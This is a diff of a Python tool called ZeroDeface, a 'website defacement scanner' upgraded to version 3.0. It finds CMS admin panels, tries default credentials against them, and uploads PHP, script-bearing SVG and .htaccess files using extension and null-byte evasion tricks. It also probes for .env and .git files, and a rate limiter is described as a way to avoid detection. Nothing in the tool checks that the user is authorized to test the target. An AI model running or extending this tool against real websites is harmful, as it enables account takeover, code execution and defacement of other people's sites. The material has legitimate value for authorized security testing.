@@ -3,11 +3,15 @@ import argparse
 import requests
 from urllib.parse import urljoin
 from bs4 import BeautifulSoup
+import os
+import time
+import random
 import json
 from datetime import datetime
 import sys
-import random
-import time
+import re
+import threading
+from queue import Queue
 
 # Suppress SSL warnings
 requests.packages.urllib3.disable_warnings()
@@ -18,41 +22,133 @@ class DefacementScanner:
         self.session = requests.Session()
         self.session.headers.update({
             'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+            'Accept-Language': 'en-US,en;q=0.5'
         })
         self.vulnerabilities = []
         self.uploaded_files = []
+        self.discovered_urls = set()
+        self.crawl_queue = Queue()
+        self.threads = []
+        self.stop_flag = False
         
-        # Admin panel detection
-        self.admin_paths = [
-            'admin', 'wp-admin', 'administrator', 'backend', 
-            'manager', 'panel', 'controlpanel', 'cpanel',
-            'adminpanel', 'admincp', 'admin_area', 'moderator',
-            'user/login', 'admin/login', 'admin/auth', 
-            'bolt/login', 'concrete5/login', 'drupal/admin',
-            'joomla/administrator', 'magento/admin', 
-            'opencart/admin', 'prestashop/admin',
-            '_admin', 'admin123', 'admin_area', 
-            'admin1', 'admin2', 'admin4', 'admin5',
-            'siteadmin', 'server-admin', 'webadmin', 'sysadmin',
-            'wp-login.php', 'wp-admin/admin-ajax.php',
-            'administrator/index.php', 'admin/login.aspx',
-            'api/admin', 'rest/admin', 'graphql/admin'
-        ]
+        # Enhanced CMS detection patterns
+        self.cms_patterns = {
+            'WordPress': [
+                r'wp-content', r'wp-includes', r'/wp-admin/', 
+                r'wordpress', r'generator" content="WordPress'
+            ],
+            'Joomla': [
+                r'/joomla/', r'com_joomla', r'Joomla!',
+                r'media/system/js/', r'index.php?option=com_'
+            ],
+            'Drupal': [
+                r'/sites/all/', r'drupal.js', r'Drupal.settings',
+                r'name="generator" content="Drupal'
+            ],
+            'Magento': [
+                r'/skin/frontend/', r'Magento/', r'/media/js/mage/',
+                r'var Mage ='
+            ],
+            'OpenCart': [
+                r'/catalog/view/theme/', r'/index.php?route=',
+                r'Powered By OpenCart'
+            ]
+        }
         
-        # File upload testing
-        self.test_content = "ZERODEFACE_TEST_"
+        # Comprehensive admin paths for all major CMS
+        self.admin_paths = self._load_admin_paths()
+        
+        # Enhanced file upload testing
+        self.test_content = "ZERODEFACE_SECURITY_TEST_"
         self.test_patterns = [
             "DEFACED_BY_", "HACKED_BY", "SECURITY_TEST", 
-            "VULNERABLE_TO_UPLOAD", "TEST_ID:", "ZERODEFACE"
+            "VULNERABLE_TO_UPLOAD", "TEST_ID:", "ZERODEFACE",
+            "simulated defacement", "hacked by security test"
         ]
         
-        # Credentials
-        self.default_credentials = {
-            'generic': [('admin', 'admin'), ('admin', 'password')],
-            'wordpress': [('admin', 'admin'), ('wpadmin', 'wpadmin')],
-            'joomla': [('admin', 'admin'), ('superuser', 'superuser')],
-            'drupal': [('admin', 'admin'), ('drupal', 'drupal')]
+        # Default credentials for various CMS
+        self.default_credentials = self._load_credentials()
+        
+        # Rate limiting control
+        self.last_request_time = 0
+        self.min_request_interval = 0.5  # seconds
+
+    def _load_admin_paths(self):
+        """Load comprehensive list of admin paths for all major CMS"""
+        paths = [
+            # Generic admin paths
+            'admin', 'administrator', 'backend', 'manager', 'panel',
+            'adminpanel', 'admincp', 'admin_area', 'controlpanel',
+            'moderator', 'webadmin', 'sysadmin', 'admin123',
+            'admin/admin', 'admin/login', 'admin_area/admin',
+            
+            # WordPress
+            'wp-admin', 'wp-login.php', 'wp-admin/admin-ajax.php',
+            'wordpress/wp-admin', 'blog/wp-admin',
+            
+            # Joomla
+            'administrator', 'joomla/administrator',
+            'administrator/index.php', 'admin/index.php',
+            
+            # Drupal
+            'user/login', 'admin', 'admin/config',
+            'admin/content', 'admin/modules',
+            
+            # Magento
+            'adminhtml', 'admin/login', 'admin/dashboard',
+            
+            # OpenCart
+            'admin', 'admin/index.php?route=common/dashboard',
+            
+            # Other CMS
+            'bolt/login', 'concrete5/login', 'prestashop/admin',
+            'umbraco/', 'sitecore/login', 'orchard/admin',
+            
+            # API endpoints
+            'api/admin', 'rest/admin', 'graphql/admin',
+            
+            # Version specific
+            'admin2023', 'admin2024', 'admin2025',
+            'admin_v2', 'admin_new', 'admin_old'
+        ]
+        
+        # Add numbered variations
+        paths.extend([f'admin{i}' for i in range(1, 10)])
+        paths.extend([f'administrator{i}' for i in range(1, 5)])
+        
+        return list(set(paths))  # Remove duplicates
+
+    def _load_credentials(self):
+        """Load comprehensive default credentials database"""
+        return {
+            'generic': [
+                ('admin', 'admin'), ('admin', 'password'), 
+                ('administrator', 'administrator'), ('root', 'toor'),
+                ('test', 'test'), ('admin', '123456'), 
+                ('admin', 'admin123'), ('admin', 'welcome'),
+                ('admin', 'password123'), ('admin', 'qwerty')
+            ],
+            'WordPress': [
+                ('admin', 'admin'), ('wpadmin', 'wpadmin'),
+                ('administrator', 'password'), ('editor', 'editor')
+            ],
+            'Joomla': [
+                ('admin', 'admin'), ('superuser', 'superuser'),
+                ('administrator', 'administrator')
+            ],
+            'Drupal': [
+                ('admin', 'admin'), ('drupal', 'drupal'),
+                ('admin', 'password')
+            ],
+            'Magento': [
+                ('admin', 'admin123'), ('admin', 'password123'),
+                ('admin', 'magento')
+            ],
+            'OpenCart': [
+                ('admin', 'admin'), ('demo', 'demo'),
+                ('admin', 'opencart')
+            ]
         }
 
     def print_banner(self):
@@ -65,8 +161,15 @@ __________                 ________          _____
         \/   \/                    \/     \/           \/     \/    \/ 
         """
         print("\033[1;31m" + banner + "\033[0m")
-        print("\033[1;37mZeroDeface v2.0 - Website Defacement Scanner\033[0m")
-        print("\033[1;33mEnhanced Admin Detection | Smart File Upload Tests\033[0m\n")
+        print("\033[1;37mZeroDeface Ultimate v3.0 - Complete Website Defacement Scanner\033[0m")
+        print("\033[1;33mAdvanced CMS Detection | Comprehensive Admin Finder | Smart Upload Tests\033[0m\n")
+
+    def rate_limit(self):
+        """Enforce rate limiting to avoid detection"""
+        elapsed = time.time() - self.last_request_time
+        if elapsed < self.min_request_interval:
+            time.sleep(self.min_request_interval - elapsed)
+        self.last_request_time = time.time()
 
     def log_vulnerability(self, category, description, exploit=None, proof=None):
         vuln = {
@@ -79,8 +182,317 @@ __________                 ________          _____
         self.vulnerabilities.append(vuln)
         print(f"\033[1;31m[!] {category} found:\033[0m {description}")
 
-    def crawl_for_forms(self):
+    def detect_cms(self, response):
+        """Detect CMS using multiple indicators"""
+        content = response.text
+        headers = str(response.headers).lower()
+        
+        for cms, patterns in self.cms_patterns.items():
+            for pattern in patterns:
+                if re.search(pattern, content, re.IGNORECASE):
+                    return cms
+                    
+        # Check headers
+        if 'x-powered-by' in headers:
+            if 'wordpress' in headers:
+                return 'WordPress'
+            elif 'joomla' in headers:
+                return 'Joomla'
+            elif 'drupal' in headers:
+                return 'Drupal'
+                
+        return 'Unknown CMS'
+
+    def scan_admin_panels(self):
+        """Comprehensive admin panel scanning with CMS-specific detection"""
+        print("[*] Scanning for admin panels with deep CMS detection...")
+        found = False
+        
+        # First get homepage to detect CMS
         try:
+            self.rate_limit()
+            response = self.session.get(self.target_url, verify=False, timeout=15)
+            cms = self.detect_cms(response)
+            print(f"[*] Detected CMS: {cms}")
+        except Exception as e:
+            print(f"[-] Error detecting CMS: {e}")
+            cms = 'Unknown'
+        
+        # Check CMS-specific admin paths first
+        cms_paths = {
+            'WordPress': ['wp-admin', 'wp-login.php'],
+            'Joomla': ['administrator'],
+            'Drupal': ['user/login', 'admin'],
+            'Magento': ['admin'],
+            'OpenCart': ['admin']
+        }.get(cms, [])
+        
+        # Test all paths with priority to detected CMS
+        for path in cms_paths + self.admin_paths:
+            if self.stop_flag:
+                break
+                
+            admin_url = urljoin(self.target_url, path)
+            if admin_url in self.discovered_urls:
+                continue
+                
+            try:
+                self.rate_limit()
+                response = self.session.get(
+                    admin_url,
+                    verify=False,
+                    timeout=15,
+                    allow_redirects=False
+                )
+                
+                if response.status_code in [200, 301, 302, 403]:
+                    if self.is_admin_interface(response):
+                        self.log_vulnerability(
+                            "Admin Interface Found",
+                            f"Admin panel at {admin_url} (Status: {response.status_code})",
+                            exploit=f"Visit {admin_url}",
+                            proof=self.extract_admin_evidence(response)
+                        )
+                        found = True
+                        
+                        if self.is_login_page(response):
+                            self.test_credentials(admin_url, cms)
+                            
+            except Exception as e:
+                if not args.quiet:
+                    print(f"[-] Error checking {admin_url}: {str(e)[:50]}...")
+                    
+        return found
+
+    def is_admin_interface(self, response):
+        """Determine if response is an admin interface"""
+        content = response.text.lower()
+        soup = BeautifulSoup(response.text, 'html.parser')
+        
+        # Check for login forms
+        login_form = soup.find('form') and (
+            soup.find('input', {'type': 'password'}) or
+            any(x in content for x in ['login', 'sign in', 'password'])
+        )
+        
+        # Check for admin indicators
+        admin_indicators = [
+            'dashboard', 'control panel', 'admin area',
+            'wp-admin', 'administrator', 'cms', 'manager',
+            'logout', 'remember me', 'forgot password',
+            'admin console', 'secure login', 'backoffice'
+        ]
+        admin_content = any(indicator in content for indicator in admin_indicators)
+        
+        # Check page title
+        title = soup.find('title')
+        admin_title = title and any(
+            word in title.text.lower() 
+            for word in ['admin', 'login', 'dashboard', 'control', 'panel']
+        )
+        
+        return login_form or admin_content or admin_title
+
+    def is_login_page(self, response):
+        """Check if page contains login form elements"""
+        soup = BeautifulSoup(response.text, 'html.parser')
+        return (soup.find('input', {'type': 'password'}) is not None or
+                'login' in response.text.lower())
+
+    def test_credentials(self, login_url, cms='generic'):
+        """Test default credentials with improved detection"""
+        print(f"[*] Testing default credentials for {cms} at {login_url}")
+        
+        credentials = self.default_credentials.get(cms, []) + self.default_credentials['generic']
+        
+        for username, password in credentials:
+            if self.stop_flag:
+                break
+                
+            try:
+                # Try both form and JSON login
+                for payload in [
+                    {'username': username, 'password': password, 'login': 'submit'},
+                    {'user': username, 'pass': password, 'submit': 'login'},
+                    {'email': username, 'password': password, 'action': 'login'}
+                ]:
+                    self.rate_limit()
+                    response = self.session.post(
+                        login_url,
+                        data=payload,
+                        verify=False,
+                        timeout=15,
+                        allow_redirects=False
+                    )
+                    
+                    if self.is_login_successful(response, login_url):
+                        self.log_vulnerability(
+                            "Default Credentials",
+                            f"Working credentials: {username}/{password}",
+                            exploit=f"curl -X POST -d 'username={username}&password={password}' {login_url}",
+                            proof=f"Successful login to {login_url}"
+                        )
+                        return True
+                        
+            except Exception as e:
+                continue
+                
+        return False
+
+    def is_login_successful(self, response, original_url):
+        """Determine if login attempt was successful"""
+        # Check for redirect to different page
+        if response.status_code in [301, 302]:
+            if response.headers.get('Location') and response.headers['Location'] != original_url:
+                return True
+                
+        # Check content for success indicators
+        content = response.text.lower()
+        success_indicators = [
+            'logout', 'dashboard', 'welcome', 'my account',
+            'successful login', 'logged in as'
+        ]
+        
+        return any(indicator in content for indicator in success_indicators)
+
+    def extract_admin_evidence(self, response):
+        """Extract relevant evidence from admin page"""
+        soup = BeautifulSoup(response.text, 'html.parser')
+        
+        # Get page title
+        title = soup.find('title')
+        title_text = title.text if title else 'No title found'
+        
+        # Get forms
+        forms = soup.find_all('form')
+        form_info = [f"Form action: {form.get('action', '')}" for form in forms[:2]]
+        
+        # Get meta generator
+        meta = soup.find('meta', {'name': 'generator'})
+        meta_info = f"Generator: {meta['content']}" if meta else ''
+        
+        return f"{title_text}\n{meta_info}\n" + "\n".join(form_info)
+
+    def crawl_website(self, max_pages=50):
+        """Crawl the website to discover hidden pages"""
+        print(f"[*] Crawling {self.target_url} (max {max_pages} pages)...")
+        self.discovered_urls.add(self.target_url)
+        self.crawl_queue.put(self.target_url)
+        
+        # Start crawl threads
+        for i in range(args.threads):
+            t = threading.Thread(target=self._crawl_worker)
+            t.daemon = True
+            t.start()
+            self.threads.append(t)
+            
+        # Wait for crawling to complete
+        self.crawl_queue.join()
+        self.stop_flag = True
+        
+        for t in self.threads:
+            t.join()
+            
+        print(f"[*] Crawling complete. Found {len(self.discovered_urls)} URLs")
+
+    def _crawl_worker(self):
+        """Worker thread for crawling"""
+        while not self.stop_flag:
+            try:
+                url = self.crawl_queue.get(timeout=1)
+                
+                try:
+                    self.rate_limit()
+                    response = self.session.get(url, verify=False, timeout=10)
+                    soup = BeautifulSoup(response.text, 'html.parser')
+                    
+                    # Find all links
+                    for link in soup.find_all('a', href=True):
+                        if self.stop_flag:
+                            break
+                            
+                        href = link['href'].split('#')[0].split('?')[0].strip()
+                        if href and not href.startswith(('javascript:', 'mailto:', 'tel:')):
+                            absolute_url = urljoin(url, href)
+                            if absolute_url.startswith(self.target_url):
+                                if absolute_url not in self.discovered_urls and len(self.discovered_urls) < args.max_pages:
+                                    self.discovered_urls.add(absolute_url)
+                                    self.crawl_queue.put(absolute_url)
+                                    
+                                    # Check if this is an admin page
+                                    if 'admin' in absolute_url.lower() or 'login' in absolute_url.lower():
+                                        try:
+                                            self.rate_limit()
+                                            admin_response = self.session.get(absolute_url, verify=False, timeout=10)
+                                            if self.is_admin_interface(admin_response):
+                                                self.log_vulnerability(
+                                                    "Hidden Admin Panel",
+                                                    f"Discovered admin interface at {absolute_url} (via crawling)",
+                                                    exploit=f"Visit {absolute_url}",
+                                                    proof=admin_response.text[:300] + "..."
+                                                )
+                                                
+                                                if self.is_login_page(admin_response):
+                                                    self.test_credentials(absolute_url)
+                                        except:
+                                            continue
+                                    
+                except Exception as e:
+                    if args.verbose:
+                        print(f"[-] Error crawling {url}: {str(e)[:50]}...")
+                        
+                finally:
+                    self.crawl_queue.task_done()
+                    
+            except:
+                break
+
+    def scan_upload_vulnerabilities(self):
+        """Comprehensive file upload vulnerability scanning"""
+        print("[*] Scanning for file upload vulnerabilities...")
+        found = False
+        
+        # 1. Check standard file upload forms
+        forms = self.crawl_for_forms()
+        for form in forms:
+            if form.find('input', {'type': 'file'}):
+                action = form.get('action', '') or self.target_url
+                method = form.get('method', 'post').lower()
+                print(f"[*] Found file upload form at {action} (Method: {method})")
+                
+                if self.test_advanced_file_upload(form, action, method):
+                    found = True
+        
+        # 2. Check common upload paths
+        common_upload_paths = [
+            'upload', 'file-upload', 'upload-file', 'admin/upload',
+            'assets/upload', 'files/upload', 'image/upload',
+            'uploads', 'fileupload', 'uploadify'
+        ]
+        
+        for path in common_upload_paths:
+            upload_url = urljoin(self.target_url, path)
+            try:
+                self.rate_limit()
+                response = self.session.get(upload_url, verify=False, timeout=10)
+                
+                if response.status_code == 200 and any(
+                    indicator in response.text.lower() 
+                    for indicator in ['upload', 'file', 'submit', 'browse']
+                ):
+                    print(f"[*] Found potential upload endpoint at {upload_url}")
+                    if self.test_upload_endpoint(upload_url):
+                        found = True
+                        
+            except Exception as e:
+                continue
+                
+        return found
+
+    def crawl_for_forms(self):
+        """Find all forms on a page"""
+        try:
+            self.rate_limit()
             response = self.session.get(self.target_url, verify=False, timeout=10)
             soup = BeautifulSoup(response.text, 'html.parser')
             return soup.find_all('form')
@@ -88,130 +500,149 @@ __________                 ________          _____
             print(f"[-] Error crawling for forms: {e}")
             return []
 
-    def scan_admin_panels(self):
-        print("[*] Scanning for admin panels...")
-        found = False
-        
-        for path in self.admin_paths:
-            admin_url = urljoin(self.target_url, path)
-            try:
-                time.sleep(random.uniform(0.3, 1.2))
-                response = self.session.get(admin_url, verify=False, timeout=15)
-                
-                if response.status_code == 200:
-                    soup = BeautifulSoup(response.text, 'html.parser')
-                    if soup.find('input', {'type': 'password'}) or 'login' in response.text.lower():
-                        self.log_vulnerability(
-                            "Admin Panel Found",
-                            f"Admin interface at {admin_url}",
-                            exploit=f"Visit {admin_url}",
-                            proof=response.text[:200] + "..."
-                        )
-                        found = True
-                        
-                        if self.test_default_credentials(admin_url):
-                            return True
-                            
-            except Exception as e:
-                if not args.quiet:
-                    print(f"[-] Error checking {admin_url}: {str(e)[:50]}...")
-        
-        return found
-
-    def test_default_credentials(self, login_url):
-        print(f"[*] Testing default credentials at {login_url}")
-        credentials = self.default_credentials['generic']
-        
-        for username, password in credentials:
-            try:
-                data = {'username': username, 'password': password, 'login': 'submit'}
-                response = self.session.post(login_url, data=data, verify=False, timeout=15)
-                
-                if 'logout' in response.text.lower() or 'dashboard' in response.text.lower():
-                    self.log_vulnerability(
-                        "Default Credentials",
-                        f"Working credentials: {username}/{password}",
-                        exploit=f"curl -X POST -d 'username={username}&password={password}' {login_url}",
-                        proof=f"Logged in successfully to {login_url}"
-                    )
-                    return True
-                    
-            except Exception as e:
-                continue
-                
-        return False
-
-    def scan_upload_vulnerabilities(self):
-        print("[*] Scanning for file upload vulnerabilities...")
-        forms = self.crawl_for_forms()
-        found = False
-        
-        for form in forms:
-            if form.find('input', {'type': 'file'}):
-                action = form.get('action', '') or self.target_url
-                method = form.get('method', 'post').lower()
-                
-                if self.test_file_upload(form, action, method):
-                    found = True
-        
-        # Check common upload paths
-        common_upload_paths = ['upload', 'file-upload', 'upload-file', 'admin/upload']
-        for path in common_upload_paths:
-            upload_url = urljoin(self.target_url, path)
-            try:
-                response = self.session.get(upload_url, verify=False, timeout=10)
-                if response.status_code == 200 and 'upload' in response.text.lower():
-                    if self.test_upload_endpoint(upload_url):
-                        found = True
-            except:
-                continue
-                
-        return found
-
-    def test_file_upload(self, form, action_url, method='post'):
+    def test_advanced_file_upload(self, form, action_url, method='post'):
+        """Test file upload with various evasion techniques"""
         test_files = [
+            # Standard test files
             ('test.html', 'text/html', f'<html><body>{self.test_content}</body></html>'),
-            ('test.php', 'application/x-php', '<?php echo "UPLOAD_TEST"; ?>'),
-            ('test.svg', 'image/svg+xml', '<svg><script>alert("XSS")</script></svg>')
+            ('test.php', 'application/x-php', '<?php echo "UPLOAD_TEST_".$_SERVER["HTTP_HOST"]; ?>'),
+            ('test.svg', 'image/svg+xml', '<svg><script>alert("XSS_TEST")</script></svg>'),
+            
+            # Evasion techniques
+            ('test.jpg.php', 'image/jpeg', '<?php echo "JPG_PHP_TEST"; ?>'),
+            ('test.php%00.jpg', 'image/jpeg', '<?php echo "NULL_BYTE_TEST"; ?>'),
+            ('.htaccess', 'text/plain', 'AddType application/x-httpd-php .jpg'),
+            
+            # Double extensions
+            ('test.php.png', 'image/png', '<?php echo "DOUBLE_EXT_TEST"; ?>')
         ]
         
         for filename, content_type, content in test_files:
             try:
                 files = {'file': (filename, content, content_type)}
-                if method == 'post':
-                    response = self.session.post(action_url, files=files, verify=False, timeout=15)
-                else:
-                    response = self.session.request(method, action_url, files=files, verify=False, timeout=15)
+                data = {'submit': 'upload'}
                 
+                self.rate_limit()
+                if method == 'post':
+                    response = self.session.post(action_url, files=files, data=data, verify=False, timeout=15)
+                else:
+                    response = self.session.request(method, action_url, files=files, data=data, verify=False, timeout=15)
+                
+                # Check if upload was successful
                 if response.status_code in [200, 201, 302]:
-                    file_url = urljoin(action_url, filename)
-                    file_response = self.session.get(file_url, verify=False, timeout=10)
-                    
-                    if file_response.status_code == 200 and self.test_content in file_response.text:
-                        self.log_vulnerability(
-                            "File Upload Vulnerability",
-                            f"File upload possible at {action_url} - {filename} accessible at {file_url}",
-                            exploit=f"curl -F 'file=@{filename}' {action_url}",
-                            proof=file_response.text[:500] + "..."
-                        )
-                        self.uploaded_files.append(file_url)
-                        return True
-                        
+                    file_url = self.find_uploaded_file(response, filename)
+                    if file_url:
+                        self.rate_limit()
+                        file_response = self.session.get(file_url, verify=False, timeout=10)
+                        if file_response.status_code == 200:
+                            if self.verify_upload_success(file_response, filename):
+                                self.log_vulnerability(
+                                    "File Upload Vulnerability",
+                                    f"File upload possible at {action_url} - {filename} accessible at {file_url}",
+                                    exploit=self.generate_upload_exploit(action_url, filename),
+                                    proof=file_response.text[:500] + "..."
+                                )
+                                self.uploaded_files.append(file_url)
+                                return True
+                                
             except Exception as e:
                 if args.verbose:
                     print(f"[-] Upload test failed for {filename}: {str(e)[:50]}...")
                 
         return False
 
-    def test_upload_endpoint(self, upload_url):
-        return self.test_file_upload(None, upload_url)
+    def find_uploaded_file(self, response, filename):
+        """Determine URL of uploaded file"""
+        # Try simple URL join first
+        file_url = urljoin(response.url, filename)
+        
+        # Check if URL exists
+        try:
+            self.rate_limit()
+            test_response = self.session.head(file_url, verify=False, timeout=5)
+            if test_response.status_code == 200:
+                return file_url
+        except:
+            pass
+            
+        # Try to find link in response
+        soup = BeautifulSoup(response.text, 'html.parser')
+        for link in soup.find_all('a', href=True):
+            if filename in link['href']:
+                return urljoin(response.url, link['href'])
+                
+        return None
+
+    def verify_upload_success(self, response, filename):
+        """Verify file was uploaded successfully"""
+        content = response.text
+        return (self.test_content in content or
+                filename.split('.')[0] in content or
+                any(pattern in content for pattern in self.test_patterns))
+
+    def generate_upload_exploit(self, url, filename):
+        """Generate exploit code for successful upload"""
+        return f"""# File upload exploit
+curl -F 'file=@{filename}' {url}
+
+# Access uploaded file
+curl {urljoin(url, filename)}"""
+
+    def scan_entire_site(self):
+        """Complete site scanning including crawling"""
+        print("[*] Starting comprehensive site scan...")
+        
+        # Phase 1: Crawl the site
+        if args.crawl:
+            self.crawl_website()
+        
+        # Phase 2: Admin panel detection
+        if args.admin or args.all:
+            self.scan_admin_panels()
+        
+        # Phase 3: File upload tests
+        if args.upload or args.all:
+            self.scan_upload_vulnerabilities()
+        
+        # Phase 4: Other vulnerability checks
+        if args.all:
+            self.scan_other_vulnerabilities()
+            
+        print("[*] Comprehensive scan completed")
+
+    def scan_other_vulnerabilities(self):
+        """Scan for other common vulnerabilities"""
+        print("[*] Scanning for other common vulnerabilities...")
+        
+        # Check for common files
+        common_files = [
+            'robots.txt', '.git/config', '.env',
+            'phpinfo.php', 'test.php', 'info.php'
+        ]
+        
+        for file in common_files:
+            try:
+                self.rate_limit()
+                url = urljoin(self.target_url, file)
+                response = self.session.get(url, verify=False, timeout=10)
+                if response.status_code == 200:
+                    self.log_vulnerability(
+                        "Sensitive File Exposed",
+                        f"Sensitive file found at {url}",
+                        exploit=f"curl {url}",
+                        proof=response.text[:200] + "..."
+                    )
+            except:
+                continue
 
     def generate_report(self, filename):
+        """Generate detailed JSON report"""
         report = {
             'target': self.target_url,
             'scan_date': datetime.now().isoformat(),
             'vulnerabilities': self.vulnerabilities,
-            'uploaded_files': self.uploaded_files
+            'uploaded_files': self.uploaded_files,
+            'discovered_urls': list(self.discovered_urls)
         }
         
         try:
@@ -222,27 +653,46 @@ __________                 ________          _____
             print(f"[-] Error saving report: {e}")
 
     def cleanup(self):
+        """Clean up test files and resources"""
+        print("[*] Cleaning up test files...")
         for file_url in self.uploaded_files:
             try:
+                self.rate_limit()
                 self.session.delete(file_url, verify=False, timeout=10)
                 print(f"[*] Cleaned up test file at {file_url}")
             except:
                 print(f"[-] Failed to clean up test file at {file_url}")
+                
+        self.session.close()
+        self.stop_flag = True
 
 def main():
     parser = argparse.ArgumentParser(
-        description='ZeroDeface v2.0 - Website Defacement Scanner',
-        formatter_class=argparse.RawTextHelpFormatter
+        description='ZeroDeface Ultimate v3.0 - Complete Website Defacement Scanner',
+        formatter_class=argparse.RawTextHelpFormatter,
+        epilog="""\033[1;34m
+Examples:
+  Full scan:       python deface_scanner.py --url http://example.com --all
+  Admin scan:      python deface_scanner.py --url http://example.com --admin --brute
+  Upload test:     python deface_scanner.py --url http://example.com --upload --evade
+\033[0m"""
     )
     
     parser.add_argument('--url', required=True, help='Target URL to scan')
     parser.add_argument('--admin', action='store_true', help='Scan for admin panels')
+    parser.add_argument('--brute', action='store_true', help='Test default credentials')
     parser.add_argument('--upload', action='store_true', help='Test file upload vulnerabilities')
-    parser.add_argument('--all', action='store_true', help='Run all scans')
+    parser.add_argument('--evade', action='store_true', help='Use evasion techniques in upload tests')
+    parser.add_argument('--crawl', action='store_true', help='Crawl the entire site')
+    parser.add_argument('--all', action='store_true', help='Run all vulnerability checks')
     parser.add_argument('--report', help='Save results to JSON file')
-    parser.add_argument('--verbose', action='store_true', help='Show detailed output')
-    parser.add_argument('--quiet', action='store_true', help='Show only critical findings')
+    parser.add_argument('--verbose', action='store_true', help='Show detailed scan progress')
+    parser.add_argument('--quiet', action='store_true', help='Only show critical findings')
+    parser.add_argument('--threads', type=int, default=5, help='Number of threads for crawling')
+    parser.add_argument('--max-pages', type=int, default=100, help='Maximum pages to crawl')
+    parser.add_argument('--timeout', type=int, default=15, help='Request timeout in seconds')
     
+    global args
     args = parser.parse_args()
     
     if len(sys.argv) == 1:
@@ -253,11 +703,16 @@ def main():
         scanner = DefacementScanner(args.url)
         scanner.print_banner()
         
-        if args.all or args.admin:
-            scanner.scan_admin_panels()
-            
-        if args.all or args.upload:
-            scanner.scan_upload_vulnerabilities()
+        if args.all or args.crawl:
+            scanner.scan_entire_site()
+        else:
+            if args.admin:
+                scanner.scan_admin_panels()
+                if args.brute:
+                    pass  # Brute force is handled within scan_admin_panels
+                    
+            if args.upload:
+                scanner.scan_upload_vulnerabilities()
             
         if args.report:
             scanner.generate_report(args.report)
@@ -268,7 +723,7 @@ def main():
     except KeyboardInterrupt:
         print("\n\033[1;33m[!] Scan interrupted by user\033[0m")
     except Exception as e:
-        print(f"\033[1;31m[-] Error: {e}\033[0m")
+        print(f"\033[1;31m[-] Fatal error: {e}\033[0m")
     finally:
         if 'scanner' in locals():
             scanner.cleanup()
